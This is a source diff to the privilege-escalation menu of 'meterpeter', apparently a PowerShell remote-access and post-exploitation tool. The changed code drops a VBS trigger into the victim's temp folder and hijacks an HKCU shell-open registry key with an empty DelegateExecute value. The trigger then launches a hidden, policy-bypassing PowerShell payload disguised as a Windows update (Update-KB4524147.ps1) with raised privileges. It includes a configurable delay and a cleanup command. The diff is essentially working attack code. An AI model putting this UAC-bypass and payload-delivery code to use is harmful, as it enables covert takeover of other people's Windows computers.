@@ -803,9 +803,9 @@ While($Client.Connected)
       $choise = Read-Host;
       If($choise -eq "Escalate" -or $choice -eq "escalate")
       {
-        write-host "   Modules     Description                  Remark" -ForegroundColor green;
+        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
-        write-host "   GetSystem   Escalate Client Privs        Client:User  - Privileges required";
+        write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
         write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
@@ -816,21 +816,29 @@ While($Client.Connected)
           $File = "$Bin$name"
           If(([System.IO.File]::Exists("$File")))
           {
+            write-host " - Input Delay Time (sec): " -NoNewline;
+            $Input_Delay = Read-Host;
+            If(-not ($Input_Delay)){$Input_Delay = "120"}
+            $trigger = "WStore.vbs";
+            $trigger_File = "$IPATH$trigger";
+            $Delay_Time = "$Input_Delay"+"000";
+            Copy-Item -Path $File -Destination $trigger_File -Force;
+            ((Get-Content -Path $trigger_File -Raw) -Replace "120000","$Delay_Time")|Set-Content -Path $trigger_File;
             write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-            Write-Host "   Status     Delay       Remote Path" -ForeGroundColor green;
-            Write-Host "   ------     -----       ----------";
-            Write-Host "   Uploaded   2(minutes)  `$env:tmp\trigger.vbs`n`n";
+            Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
+            Write-Host "   ------   ----------            ------";
+            Write-Host "   Upload   `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
             Write-Host "   [i] Exit|Restart meterpeter (use same ip|port|obfuscation)" -ForeGroundColor yellow;
-            Write-Host "   [i] to recive the elevated Connection back in 2 minutes time." -ForeGroundColor yellow;
+            Write-Host "   [i] to recive the elevated Connection back in xx seconds." -ForeGroundColor yellow;
             ## Write Local script (trigger.vbs) to Remote-Host $env:tmp
-            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = [io.file]::ReadAllBytes("$trigger_File") -join ',';
             $FileBytes = "($FileBytes)";
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   Saved   `$env:tmp\trigger.vbs`" `> privescal.txt;cmd /R start %tmp%\trigger.vbs";
+            $Command = "`$1=`"`$env:tmp\WStore.vbs`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   Saved   `$env:tmp\WStore.vbs`" `> privescal.txt;cmd /R start %tmp%\WStore.vbs";
             ## $Command = Variable_Obfuscation(Character_Obfuscation($Command));
-            $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
+            $File = "`$env:tmp\WStore.vbs";
             $Upload = $True;
           }else{
             ## Local File { trigger.vbs } not found .
@@ -844,14 +852,18 @@ While($Client.Connected)
         }
         If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
         {
-          write-host " Delete Privilege Escalation Old Configurations." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;echo `"   [i] Privilege Escalation Reg hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Privilege Escalation Reg hive NOT FOUND ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+          write-host " Delete Privilege Escalation Old Files|Configurations." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;cmd /R del /Q /F %tmp%\WStore.vbs;echo `"   [i] Privilege Escalation Registry hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Privilege Escalation Vulnerable Registry hive: [NOT FOUND] ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}";
         }
         If($Escal_choise -eq "Return" -or $Escal_choise -eq "return" -or $Escal_choise -eq "cls" -or $Escal_choise -eq "Modules" -or $Escal_choise -eq "modules" -or $Escal_choise -eq "clear")
         {
+          $File = $Null;
           $choise = $Null;
           $Command = $Null;
+          $trigger = $Null;
           $Escal_choise = $Null;
+          $trigger_File = $Null;
+          $Input_Delay = $Null;
         }
       }
       If($choise -eq "CamSnap" -or $choise -eq "snap")
